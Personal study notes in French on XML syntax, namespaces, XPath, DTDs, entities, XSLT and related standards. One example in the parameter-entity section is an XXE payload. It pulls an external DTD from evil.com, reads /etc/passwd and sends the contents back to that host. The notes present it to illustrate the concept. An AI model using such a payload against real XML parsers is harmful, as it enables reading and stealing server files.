# XML

## Généralités

* Abréviation de eXtensible Markup Language
* Conçu pour le transport et le stockage des données
* Décrit ce que _sont_ les données \(tandis qu’HTML décrit ce à quoi elles ressemblent\)
* Certains caractères sont systématiquement interprété par le parser, il faut donc utiliser des _entity_ :

| Caractère | Entity |
| :--- | :--- |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `'` | `&apos;` |
| `"` | `&quot;` |

* `<!-- Ceci est un commentaire -->`
* `<!-- Ceci est un -- commentaire invalide -->`

## Structure

* Description du document optionnel \(obligatoirement en premier\) :

  `<?xml version="1.0" encoding="UTF-8"?>` 

* Un élément parent à tous les autres \(en dehors de la description\)
* Structure hiérarchique pour le reste

## Tags/éléments/nœuds

* Ces 3 termes sont synonymes
* `<elementName></elementName>`
* Aucun nom prédéfinis, mis à part pour le `<?xml>` \(et ces variantes type `<Xml>`\)
* Case-sensitive
* Commence par une lettre ou un \_
* Ne peut contenir des espaces
* Peut contenir des lettres/nombres/`_`/`.`
* Peuvent être vide `<element></element>` et se fermer tout seul `<element />`
* Un élément entouré de CDATA ne sera pas interprété `<![CDATA[content]]>`

## Attributs

* Possibilité d'ajouter des attributs aux tags :

  `<elementName attributeName="attribute value"></elementName>`

* Aucun prédéfinis 
* Toujours entre `“”` \(ou `‘’`\) même si ce sont des nombres/autres
* En général, les metadata \(par exemple un id\) devraient être des attributs, tandis que les données en elles-mêmes \(par exemple une date\) devraient être des tags.

## Exemple

```markup
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
  <book category="cooking">
    <title lang="en">Everyday Italian</title>
    <author>Giada De Laurentiis</author>
    <year>2005</year>
    <price>30.00</price>
  </book>
  <book category="children">
    <title lang="en">Harry Potter</title>
    <author>J K. Rowling</author>
    <year>2005</year>
    <price>29.99</price>
  </book>
  <book category="web">
    <title lang="en">Learning XML</title>
    <author>Erik T. Ray</author>
    <year>2003</year>
    <price>39.95</price>
  </book>
</bookstore>
```

## Namespace

Si on a 2 éléments avec un même nom mais ne représentant pas le même type d'informations, on peut préciser des namespace.

```markup
<table xmlns="http://www.w3.org/TR/html4/">
  <tr>
    <td>Apples</td>
    <td>Bananas</td>
  </tr>
</table>
```

On peut aussi préciser un prefix à utiliser `xmlns:prefix="URI"` \(le lien n'est pas suivis par le parser et est juste informatif\) :

```markup
<root>
<h:table xmlns:h="http://www.w3.org/TR/html4/">
  <h:tr>
    <h:td>Apples</h:td>
    <h:td>Bananas</h:td>
  </h:tr>
</h:table>

<f:table xmlns:f="https://www.w3schools.com/furniture">
  <f:name>African Coffee Table</f:name>
  <f:width>80</f:width>
  <f:length>120</f:length>
</f:table>
</root>
```

On peut aussi directement specifier les prefix dans le 1er élément du document :

```markup
<root xmlns:h="http://www.w3.org/TR/html4/"
xmlns:f="https://www.w3schools.com/furniture">
```

## XPath

* Permet de naviguer un document XML \(en sélectionant des noeuds particulier\)
* Les expression XPath sont aussi utilisées dans d'autre languages
* Suit la structure des chemins de fichiers

| Expression | Definition |
| :--- | :--- |
| nodename | Selects all nodes with the name "nodename" |
| / | Selects any direct children matching |
| // | Selects any descendant matching |
| . | Selects the current node |
| .. | Selects direct parent |
| @ | Selects attributes |

### Opérateurs

* `|` Combine des sélections : `//book | //cd`
* `+`, `-`, `*`, `div`, `mod`
* `=`, `!=`, `<`, `<=`, `>`, `>=`
* `and`, `or`

### Prédicat \(condition\)

Les conditions sont écrites entre \[\] : `/bookstore/book[1]`

Exemple de conditions :

* `/bookstore/book[1]` \(Commence à 1\)
* `/bookstore/book[last()]`
* `/bookstore/book[last() - 1]`
* `/bookstore/book[position() < 3]`
* `//title[@lang]`
* `//title[@lang='en']`
* `/bookstore/book[price > 35.00]`
* `/bookstore/book[price > 35.00]/title`

### Wildcard

| Wildcard | Definition |
| :--- | :--- |
| \* | Any element node |
| @\* | Any attributes |
| node\(\) | Any node of any kind |
| text\(\) | Any text node |

Je suis pas certaine de la diff entre `*` et `node()`.

### Location Path

On peut aussi définir des chemins plus explicitement \(même si ça me semble très redondant avec l'autre méthode donc je comprends moyen\) ainsi : `axisname::nodetest[predicate]`

nodetest représente ce genre de sélection :

* `attribute::lang`
* `child::text()`
* `descendant::book`
* `child::*/child::price`

Les axes suivantes existent :

* `ancestor`
* `ancestor-or-self`
* `attribute`
* `child`
* `descendant`
* `descendant-or-self`
* `following` Selects everything after the closing tag of the current node
* `following-sibling` Selects all siblings after the current node
* `namespace` Selects all namespace nodes of the current node
* `parent`
* `preceding` Selects all nodes that appear before the current node in the document, except ancestors, attribute nodes and namespace nodes
* `preceding-sibling` Selects all siblings before the current node
* `self` Selects the current node

## XML DTD

* DTD pour _Document Type Definition_
* Définis la structure que devrait avoir un document xml
* On spécifie le DTD avant le premier noeud \(hors description\) dans un élément `<!DOCTYPE>` \(qui n'a pas de `/` fermante\)
  * Déclaration dans le fichier `<!DOCTYPE root_name [...]>`
  * Inclusion d'un fichier externe `<!DOCTYPE root_name SYSTEM "file">`

### Elément

On décrit un élément ainsi

```markup
<!ELEMENT element-name EMPTY>
<!ELEMENT element-name ANY>
<!ELEMENT element-name (#PCDATA)>
<!ELEMENT element-name (child1)>
<!ELEMENT element-name (child1, child2, ...)>
```

* `#PCDATA` \(_Parsed Character Data_\) signifie que ces données seront interprêtées par le parser à l'inverse des `#CDATA` \(_Character Data_\)
* Les enfants doivent se retrouver dans le même ordre dans le document xml
* Tous les enfants spécifiés doivent être déclarés \(décrits\) dans le fichier DTD
* Certains symbole ajoute des restrictions :

```markup
<!ELEMENT note (message)> <!-- Uniquement 1 enfant nommé message -->
<!ELEMENT note (message+)> <!-- 1 ou plusieurs enfants nommés message -->
<!ELEMENT element-name (message*)> <!-- 0 ou plus enfants nommés message -->
<!ELEMENT element-name (message?)> <!-- 0 or 1 enfant nommé message -->
<!ELEMENT note (to,from,header,(message|body))> <!-- to, from header obligatoire, puis soit message soit body -->
```

### Attributs

On décrit un attribut ainsi :

```markup
<!ATTLIST element_name attribute_name attribute_type attribute_value>
```

Type acceptés :

| Type | Définition |
| :--- | :--- |
| CDATA | Character data |
| \(val1\|val2\|..\) | One from the enumerated list |
| \(val1\|val2\|..\) "val1" | One from the enumerated list,                                                    defaulting to the specified one |
| ID | Unique id |
| IDREF | Id of another element |
| IDREFS | List of other ids |
| NMTOKEN | Valid XML name |
| NMTOKENS | List of valid XML names |
| ENTITY | Entity |
| ENTITIES | List of entities |
| NOTATION | Name of a notation |
| xml: | Predefined xml value |

Valeur acceptées :

| Valeur | Définition |
| :--- | :--- |
| value | The default value of the attribute |
| \#REQUIRED | The attribute is required |
| \#IMPLIED | The attribute is optional |
| \#FIXED value | The attribute value is fixed |

### Entity

L'équivalent de variable, peuvent contenir une valeur donnée ou load le contenu d'un fichier \(local ou depuis un lien\). Ce second cas est ce qu'on appelle une entité externe.

```markup
<!DOCTYPE test [
    <!ENTITY entity_name1 "entity-value">
    <!ENTITY entity_name2 SYSTEM "URI/URL">
]>
<test>&entity_name1;</test>
```

#### Parameter Entity

Elles permettent 2 choses :

* Etre référencées directement dans le DTD
* Référencer une autre entité dans leur valeur \(uniquement possible si elles sont en externe\)

L'exemple qui suit sert à une attaque mais montre bien l'idée :

```markup
<!-- test.xml-->
<?xml version="1.0" encoding="UTF-8 ?>
<!DOCTYPE test SYSTEM "http://evil.com/external.dtd">
<test>&send;</test>

<!-- external.dtd -->
    <!ENTITY % file_content SYSTEM "/etc/passwd">
    <!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%file_content;'>">
    %wrapper;
```

### Example Complet

```markup
<!DOCTYPE TVSCHEDULE [

<!ELEMENT TVSCHEDULE (CHANNEL+)>
<!ELEMENT CHANNEL (BANNER,DAY+)>
<!ELEMENT BANNER (#PCDATA)>
<!ELEMENT DAY (DATE,(HOLIDAY|PROGRAMSLOT+)+)>
<!ELEMENT HOLIDAY (#PCDATA)>
<!ELEMENT DATE (#PCDATA)>
<!ELEMENT PROGRAMSLOT (TIME,TITLE,DESCRIPTION?)>
<!ELEMENT TIME (#PCDATA)>
<!ELEMENT TITLE (#PCDATA)> 
<!ELEMENT DESCRIPTION (#PCDATA)>

<!ATTLIST TVSCHEDULE NAME CDATA #REQUIRED>
<!ATTLIST CHANNEL CHAN CDATA #REQUIRED>
<!ATTLIST PROGRAMSLOT VTR CDATA #IMPLIED>
<!ATTLIST TITLE RATING CDATA #IMPLIED>
<!ATTLIST TITLE LANGUAGE CDATA #IMPLIED>
]>
```

## Autre

### XSLT

#### Disclaimer & Explication

Ils parlent de XSL \(_eXtensible Stylesheet Language_\) et XSLT \(_XSL Transformation_\) comme si c'était 2 choses distinctes, mais je ne peux trouver aucune doc uniquement sur le XSL. On parle toujours des éléments/etc de XSLT donc je pense que c'est un abus de langage. C'est sensé être un "styling language for XML", mais il ne gère pas l'apparence \(genre couleur, placement, etc\).

A la place XSLT permet de prendre un document XML et de modifier son contenu final. C'est une analogie un peu foireuse mais je le vois ainsi : de la même façon que du code php est interprêté et modifie le contenu final d'une page php/html, un fichier xml appelant un fichier xsl sera interprêté par le parser et le résulat final ne correspondra pas au contenu du fichier xml de base \(mais se basera sur celui-ci pour la transformation\).

On l'utilise en général pour transformer un fichier XML soit en un autre fichier XML, soit en XHTML, soit en HTML.

Etant donné que le fichier de base \(xml\) et le fichier de transformation \(xsl\) sont distinct, on peut tout à fait utiliser différents fichiers de transformation en fonction de la situation.

#### Utilisation

Dans le fichier xml à transformer, linker avant le premier élément le fichier stipulant la transformation :

```markup
<?xml-stylesheet type="text/xsl" href="file.xsl"?>
```

Le premier élément d'un fichier xsl doit être `<xsl:stylesheet>` ou `<xsl:transform>` \(synonyme\) et doit déclarer le XSLT namespace :

```markup
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
```

Plusieurs éléments implémentant une certaine logique sont disponible \(comme `<xsl:for-each>`, `<xsl:value-of>`, `<xsl:if>`, etc.\) Voici une [liste complète](https://www.w3schools.com/xml/xsl_elementref.asp).

### XQuery

* XQuery is to XML what SQL is to databases
* XQuery was designed to query XML data
* La doc est une fuck fest et je doute que j'aurais vraiment besoin de savoir tout ça, donc je vais pas le résumer ici

### XSD

* _XML Schema Definition_
* Alternative plus complète que les DTD et directement écrite en XML

### XML DOM

* La doc a pas mal de choses à dire sur les éléments du DOM et leur propriétés, si un jour je dois le parcourir en code ce sera intéressant à détailler

